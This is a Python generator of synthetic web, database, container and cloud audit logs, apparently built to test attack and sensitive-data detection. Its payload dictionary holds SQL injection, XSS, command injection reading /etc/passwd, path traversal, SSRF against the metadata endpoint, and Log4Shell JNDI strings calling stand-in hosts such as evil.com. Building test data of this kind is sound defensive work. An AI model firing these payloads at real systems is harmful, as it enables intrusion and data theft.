"""
样本数据生成器
生成多种类型的日志样本，包括正常流量和攻击样本
"""

import random
import gzip
import json
import argparse
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any
from pathlib import Path
import base64
import urllib.parse

class LogSampleGenerator:
    """日志样本生成器"""
    
    def __init__(self, seed: int = 42):
        random.seed(seed)
        
        # 正常用户代理
        self.normal_user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"
        ]
        
        # 攻击用户代理
        self.attack_user_agents = [
            "sqlmap/1.4.7#stable",
            "Nikto/2.1.6",
            "Nmap Scripting Engine",
            "python-requests/2.25.1",
            "curl/7.68.0"
        ]
        
        # 正常路径
        self.normal_paths = [
            "/", "/index.html", "/about", "/contact", "/products",
            "/api/users", "/api/products", "/api/orders",
            "/static/css/style.css", "/static/js/app.js",
            "/images/logo.png", "/favicon.ico"
        ]
        
        # 攻击载荷
        self.attack_payloads = {
            'sqli': [
                "' OR 1=1--",
                "' UNION SELECT * FROM users--",
                "'; DROP TABLE users;--",
                "1' AND (SELECT COUNT(*) FROM users) > 0--",
                "admin'/**/OR/**/1=1#",
                "%27%20OR%201=1--",
                "1%27%20UNION%20SELECT%20*%20FROM%20users--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//",
                "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
            ],
            'cmd_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "`uname -a`",
                "$(cat /etc/hosts)",
                "%3Bcat%20/etc/passwd"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd"
            ],
            'ssrf': [
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/metadata",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO"
            ],
            'log4shell': [
                "${jndi:ldap://evil.com/a}",
                "${jndi:rmi://attacker.com:1099/Evil}",
                "${jndi:dns://malicious.com/a}",
                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}"
            ]
        }
        
        # 敏感信息
        self.sensitive_data = {
            'emails': [
                "user@example.com", "admin@company.com", "test@gmail.com",
                "support@service.org", "info@business.net"
            ],
            'phones': [
                "13812345678", "15987654321", "18611112222",
                "+8613800138000", "86-138-0013-8000"
            ],
            'id_cards': [
                "110101199001011234", "320102198505050987",
                "440301199212121111", "500101197808088888"
            ],
            'api_keys': [
                "sk-1234567890abcdef1234567890abcdef",
                "api_key_abcdef1234567890abcdef1234567890",
                "access_token_xyz789abc123def456ghi789"
            ],
            'jwt_tokens': [
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiIxIiwianRpIjoiYWJjZGVmZ2hpamtsbW5vcCIsImlhdCI6MTYzMjQ4NjQwMCwiZXhwIjoxNjMyNDkwMDAwfQ.example_signature"
            ]
        }
        
        # IP地址池
        self.normal_ips = [
            "192.168.1.100", "192.168.1.101", "192.168.1.102",
            "10.0.0.50", "10.0.0.51", "172.16.0.100"
        ]
        
        self.attack_ips = [
            "203.0.113.5", "198.51.100.10", "192.0.2.15",
            "185.220.101.5", "45.33.32.156"
        ]
        
    def generate_nginx_log(self, is_attack: bool = False) -> str:
        """生成Nginx访问日志"""
        
        # 选择IP和用户代理
        if is_attack:
            ip = random.choice(self.attack_ips)
            user_agent = random.choice(self.attack_user_agents)
        else:
            ip = random.choice(self.normal_ips)
            user_agent = random.choice(self.normal_user_agents)
            
        # 生成时间戳
        now = datetime.now(timezone.utc)
        timestamp = now.strftime("%d/%b/%Y:%H:%M:%S %z")
        
        # 生成请求
        if is_attack:
            method = "GET"
            path = self._generate_attack_path()
            status = random.choice([200, 403, 404, 500])
            size = random.randint(100, 5000)
        else:
            method = random.choice(["GET", "POST", "PUT", "DELETE"])
            path = random.choice(self.normal_paths)
            status = random.choice([200, 201, 204, 301, 302, 404])
            size = random.randint(500, 50000)
            
        request = f"{method} {path} HTTP/1.1"
        referer = "https://www.google.com/" if not is_attack else "-"
        
        return f'{ip} - - [{timestamp}] "{request}" {status} {size} "{referer}" "{user_agent}"'
        
    def generate_json_log(self, is_attack: bool = False) -> str:
        """生成JSON格式日志"""
        
        now = datetime.now(timezone.utc)
        
        log_entry = {
            "timestamp": now.isoformat(),
            "level": "INFO" if not is_attack else "WARN",
            "source": "web-app",
            "message": "",
            "request": {
                "method": "GET",
                "path": "/api/data",
                "ip": random.choice(self.attack_ips if is_attack else self.normal_ips),
                "user_agent": random.choice(self.attack_user_agents if is_attack else self.normal_user_agents)
            },
            "response": {
                "status": 200,
                "size": random.randint(100, 10000)
            }
        }
        
        if is_attack:
            log_entry["request"]["path"] = self._generate_attack_path()
            log_entry["response"]["status"] = random.choice([403, 500, 400])
            log_entry["message"] = "Suspicious request detected"
            
            # 添加敏感信息泄露
            if random.random() < 0.3:
                log_entry["error"] = {
                    "message": f"Database error: user email {random.choice(self.sensitive_data['emails'])} not found",
                    "stack_trace": "java.sql.SQLException at line 123"
                }
        else:
            log_entry["message"] = "Request processed successfully"
            
        return json.dumps(log_entry, ensure_ascii=False)
        
    def generate_database_log(self, is_attack: bool = False) -> str:
        """生成数据库审计日志"""
        
        now = datetime.now(timezone.utc)
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
        
        if is_attack:
            # 生成恶意SQL
            attack_type = random.choice(list(self.attack_payloads.keys()))
            if attack_type == 'sqli':
                sql = f"SELECT * FROM users WHERE id = {random.choice(self.attack_payloads['sqli'])}"
            else:
                sql = "SELECT * FROM products WHERE category = 'electronics'"
        else:
            # 生成正常SQL
            sqls = [
                "SELECT id, name FROM users WHERE active = 1",
                "INSERT INTO orders (user_id, product_id, quantity) VALUES (123, 456, 2)",
                "UPDATE users SET last_login = NOW() WHERE id = 789",
                "DELETE FROM sessions WHERE expires < NOW()"
            ]
            sql = random.choice(sqls)
            
        user = "app_user" if not is_attack else "admin"
        database = "production"
        
        return f"[{timestamp}] USER:{user} DB:{database} SQL:{sql}"
        
    def generate_container_log(self, is_attack: bool = False) -> str:
        """生成容器/Kubernetes日志"""
        
        now = datetime.now(timezone.utc)
        timestamp = now.isoformat()
        
        pod_name = f"web-app-{random.randint(1000, 9999)}"
        container_name = "nginx"
        
        if is_attack:
            message = f"Blocked request from {random.choice(self.attack_ips)}: {self._generate_attack_path()}"
            stream = "stderr"
        else:
            messages = [
                "Application started successfully",
                "Health check passed",
                "Processing user request",
                "Cache updated"
            ]
            message = random.choice(messages)
            stream = "stdout"
            
        return f"{timestamp} {stream} F {pod_name}/{container_name}: {message}"
        
    def generate_cloud_audit_log(self, is_attack: bool = False) -> str:
        """生成云审计日志"""
        
        now = datetime.now(timezone.utc)
        timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
        
        if is_attack:
            user = "suspicious_user"
            action = "DELETE_BUCKET"
            resource = "s3://sensitive-data-bucket"
            result = "DENIED"
            ip = random.choice(self.attack_ips)
        else:
            user = f"user_{random.randint(1, 100)}"
            action = random.choice(["GET_OBJECT", "PUT_OBJECT", "LIST_BUCKET"])
            resource = f"s3://app-data-{random.randint(1, 10)}"
            result = "SUCCESS"
            ip = random.choice(self.normal_ips)
            
        return f"[{timestamp}] user:{user} action:{action} resource:{resource} result:{result} source_ip:{ip}"
        
    def _generate_attack_path(self) -> str:
        """生成攻击路径"""
        base_paths = ["/api/users", "/admin/login", "/search", "/upload"]
        base_path = random.choice(base_paths)
        
        # 随机选择攻击类型
        attack_type = random.choice(list(self.attack_payloads.keys()))
        payload = random.choice(self.attack_payloads[attack_type])
        
        # 构造攻击路径
        if random.random() < 0.5:
            # 作为查询参数
            return f"{base_path}?id={payload}"
        else:
            # 作为路径的一部分
            return f"{base_path}/{payload}"
            
    def _inject_sensitive_data(self, text: str) -> str:
        """在文本中注入敏感信息"""
        if random.random() < 0.2:  # 20%概率注入敏感信息
            data_type = random.choice(list(self.sensitive_data.keys()))
            sensitive_item = random.choice(self.sensitive_data[data_type])
            
            # 随机位置插入
            insertion_points = [
                f" email={sensitive_item}",
                f" token={sensitive_item}",
                f" user_id={sensitive_item}",
                f" api_key={sensitive_item}"
            ]
            
            text += random.choice(insertion_points)
            
        return text
        
    def generate_mixed_log(self, lines: int = 1000, attack_ratio: float = 0.1) -> List[str]:
        """生成混合类型的日志"""
        
        logs = []
        attack_count = int(lines * attack_ratio)
        normal_count = lines - attack_count
        
        # 生成正常日志
        for _ in range(normal_count):
            log_type = random.choice(['nginx', 'json', 'database', 'container', 'cloud_audit'])
            
            if log_type == 'nginx':
                log = self.generate_nginx_log(False)
            elif log_type == 'json':
                log = self.generate_json_log(False)
            elif log_type == 'database':
                log = self.generate_database_log(False)
            elif log_type == 'container':
                log = self.generate_container_log(False)
            else:  # cloud_audit
                log = self.generate_cloud_audit_log(False)
                
            # 随机注入敏感信息
            log = self._inject_sensitive_data(log)
            logs.append(log)
            
        # 生成攻击日志
        for _ in range(attack_count):
            log_type = random.choice(['nginx', 'json', 'database', 'container', 'cloud_audit'])
            
            if log_type == 'nginx':
                log = self.generate_nginx_log(True)
            elif log_type == 'json':
                log = self.generate_json_log(True)
            elif log_type == 'database':
                log = self.generate_database_log(True)
            elif log_type == 'container':
                log = self.generate_container_log(True)
            else:  # cloud_audit
                log = self.generate_cloud_audit_log(True)
                
            logs.append(log)
            
        # 打乱顺序
        random.shuffle(logs)
        
        return logs
        
    def save_to_file(self, logs: List[str], filename: str, compress: bool = False) -> None:
        """保存日志到文件"""
        
        Path("samples").mkdir(exist_ok=True)
        filepath = Path("samples") / filename
        
        if compress:
            with gzip.open(f"{filepath}.gz", 'wt', encoding='utf-8') as f:
                for log in logs:
                    f.write(log + '\n')
        else:
            with open(filepath, 'w', encoding='utf-8') as f:
                for log in logs:
                    f.write(log + '\n')

def main():
    """主函数"""
    parser = argparse.ArgumentParser(description="日志样本生成器")
    parser.add_argument('--lines', type=int, default=10000, help='生成日志行数')
    parser.add_argument('--attack-ratio', type=float, default=0.1, help='攻击日志比例')
    parser.add_argument('--seed', type=int, default=42, help='随机种子')
    parser.add_argument('--output', type=str, default='mixed.log', help='输出文件名')
    parser.add_argument('--compress', action='store_true', help='压缩输出文件')
    
    args = parser.parse_args()
    
    print(f"生成 {args.lines} 行日志，攻击比例: {args.attack_ratio:.1%}")
    
    generator = LogSampleGenerator(args.seed)
    logs = generator.generate_mixed_log(args.lines, args.attack_ratio)
    
    generator.save_to_file(logs, args.output, args.compress)
    
    output_path = f"samples/{args.output}"
    if args.compress:
        output_path += ".gz"
        
    print(f"日志已保存到: {output_path}")
    print(f"实际生成: {len(logs)} 行")

if __name__ == '__main__':
    main()